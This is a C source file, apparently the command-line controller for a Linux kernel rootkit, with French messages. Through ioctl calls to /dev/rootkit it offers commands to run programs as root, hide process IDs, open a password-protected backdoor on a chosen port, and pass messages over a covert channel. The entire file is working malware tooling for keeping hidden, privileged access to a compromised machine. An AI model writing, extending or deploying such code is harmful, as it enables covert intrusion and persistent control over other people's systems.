#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include "rootkit.h"

void print_usage(const char *prog) {
    printf("Usage: %s <command> [args]\n", prog);
    printf("Commands:\n");
    printf("  privesc <command>    : Exécute une commande en tant que root\n");
    printf("  hidepid <pid>        : Cache un PID\n");
    printf("  getuid               : Affiche l'UID courant\n");
    printf("  setmsg <message>     : Définit un message pour le canal secondaire\n");
    printf("  openbackdoor <port>  : Ouvre une backdoor sur le port spécifié\n");
    printf("  setpass <password>   : Définit le mot de passe de la backdoor\n");
    printf("  readmsg              : Lit le message du canal secondaire\n");
}

int main(int argc, char **argv) {
    int fd;
    struct rk_args args = {0};
    int ret;

    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }

    fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0) {
        perror("open /dev/rootkit");
        return 1;
    }

    if (strcmp(argv[1], "privesc") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Usage: %s privesc <command>\n", argv[0]);
            return 1;
        }
        args.target = (unsigned long)argv[2];
        args.value = RK_PRIVESC_BY_CMD;
        ret = ioctl(fd, RK_CMD_PRIVESC, &args);
        if (ret < 0) {
            perror("ioctl privesc");
            return 1;
        }
        printf("Commande exécutée avec succès.\n");
    }
    else if (strcmp(argv[1], "hidepid") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Usage: %s hidepid <pid>\n", argv[0]);
            return 1;
        }
        args.target = strtoul(argv[2], NULL, 10);
        ret = ioctl(fd, RK_CMD_HIDE_PID, &args);
        if (ret < 0) {
            perror("ioctl hidepid");
            return 1;
        }
        printf("PID %lu caché avec succès.\n", args.target);
    }
    else if (strcmp(argv[1], "getuid") == 0) {
        ret = ioctl(fd, RK_CMD_GETUID, &args);
        if (ret < 0) {
            perror("ioctl getuid");
            return 1;
        }
        printf("UID courant: %lu\n", args.target);
    }
    else if (strcmp(argv[1], "setmsg") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Usage: %s setmsg <message>\n", argv[0]);
            return 1;
        }
        args.target = (unsigned long)argv[2];
        ret = ioctl(fd, RK_CMD_SET_MSG, &args);
        if (ret < 0) {
            perror("ioctl setmsg");
            return 1;
        }
        printf("Message défini avec succès.\n");
    }
    else if (strcmp(argv[1], "openbackdoor") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Usage: %s openbackdoor <port>\n", argv[0]);
            return 1;
        }
        args.target = strtoul(argv[2], NULL, 10);
        ret = ioctl(fd, RK_CMD_OPEN_BACKDOOR, &args);
        if (ret < 0) {
            perror("ioctl openbackdoor");
            return 1;
        }
        printf("Backdoor ouverte sur le port %lu.\n", args.target);
    }
    else if (strcmp(argv[1], "setpass") == 0) {
        if (argc < 3) {
            fprintf(stderr, "Usage: %s setpass <password>\n", argv[0]);
            return 1;
        }
        args.target = (unsigned long)argv[2];
        ret = ioctl(fd, RK_CMD_SET_BACKDOOR_PASS, &args);
        if (ret < 0) {
            perror("ioctl setpass");
            return 1;
        }
        printf("Mot de passe défini avec succès.\n");
    }
    else if (strcmp(argv[1], "readmsg") == 0) {
        int msg_fd = open(RK_CMD_FILE, O_RDONLY);
        if (msg_fd < 0) {
            perror("open " RK_CMD_FILE);
            return 1;
        }
        char buf[RK_MSG_MAX];
        ssize_t n = read(msg_fd, buf, sizeof(buf)-1);
        if (n < 0) {
            perror("read");
            close(msg_fd);
            return 1;
        }
        buf[n] = '\0';
        printf("Message: %s\n", buf);
        close(msg_fd);
    }
    else {
        print_usage(argv[0]);
        return 1;
    }

    close(fd);
    return 0;
}